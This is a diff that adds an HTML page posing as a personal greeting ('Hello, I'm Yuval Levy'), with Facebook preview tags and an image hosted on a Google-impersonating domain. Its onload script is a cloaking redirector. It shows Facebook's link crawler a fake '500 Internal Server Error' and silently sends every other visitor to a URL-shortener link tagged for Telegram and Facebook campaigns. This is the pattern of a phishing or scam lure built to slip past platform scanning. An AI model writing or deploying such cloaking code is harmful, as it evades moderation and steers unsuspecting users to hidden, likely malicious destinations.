@@ -1,1 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+    <title>🔴 Hello, I'm Yuval Levy</title>
+    <meta name="title" content="🔴 Hello, I'm Yuval Levy">
+    <meta name="description" content="Hello, I'm Yuval Levy">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://LeviathanIVFauna.github.io/october-yuval">
+    <meta property="og:title" content="🔴 Hello, I'm Yuval Levy">
+    <meta property="og:description" content="Hello, I'm Yuval Levy.">
+    <meta property="og:image" content="https://googleaipro.github.io/facebook-msg/og-image-git.png">
+    
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+
+            // Otherwise, redirect to a random page
+            const pages = [
+                "https://oool.ink/Yuval?utm_source=telegram&utm_campaign=post_id_n8",
+                "https://oool.ink/Yuval?utm_source=facebook&utm_campaign=post_id_n8"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
